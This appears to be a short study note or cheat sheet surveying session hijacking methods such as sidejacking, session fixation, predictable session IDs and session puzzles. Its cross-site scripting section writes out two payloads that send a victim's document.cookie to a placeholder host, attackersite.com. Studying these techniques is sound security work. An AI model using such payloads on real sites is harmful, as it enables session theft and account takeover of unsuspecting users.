# Session Hijacking Overview

##Possible information formats
1. Cookies with session id - most common
2. URL rewriting - having ?session=abc at the end of each url
3. Hidden fields - each requests contains the hidden fields information because it submits a form - less common

## Session Sidejacking
In many situations not all requests run over https. Sometimes JavaScript or images are loaded over http from the same domain. An attacker that sits in the same WiFi network can then sniff the traffic and grep the session information from those requests. 

## Session Fixation
Before the login happens the attacker fixes the session on the client side and waits for the user to login. 

If it is possible to inject HTTP headers into request the attacker can also set a known session token via the Set-Cookie header and then wait for the user to login.

## Generated cookies before authentication
When an attacker can open a webpage on the users computer and then dump the session information, he just needs to wait for the user to perform a login. Now the server treats this session as logged in for this user and you can create requests with this session.

## Predictable session IDs
In some cases the session id is just the hash or base64 encoding of some predictable or brute-forcable information like username:password. For weak passwords the attacker can brute force the session to get access to the application.

## Cross Site Scripting
When an attacker finds any page that is xss vulnerable on the target machine he can easily grap the cookie:

```
If Access-Control-Allow-Origin is set to *
http://www.vulnsite.com/vulnerablepage?username=Name<script>xmlhttp.open("GET","http://www.attackersite.com/grab_cookie.php?cookie="+document.cookie,true); xmlhttp.send();</script>

else
http://www.vulnsite.com/vulnerablepage?username=Name<script>document.location= “http://www.attackersite.com/grab_cookie.php?cookie=” + document.cookie</script>
```

## Session puzzle
In some applications the session variable is used for multiple purposes. Then a certain sequence of requests can enable attackers to bypass authentication enforcement mechanisms. A simple example would be when the forgot password page is implemented that it checks the username / e-mail input, then sets the username of this session to this user and then calls an internal function. If the user then requests any other page with the same session he is treated as authenticated.  
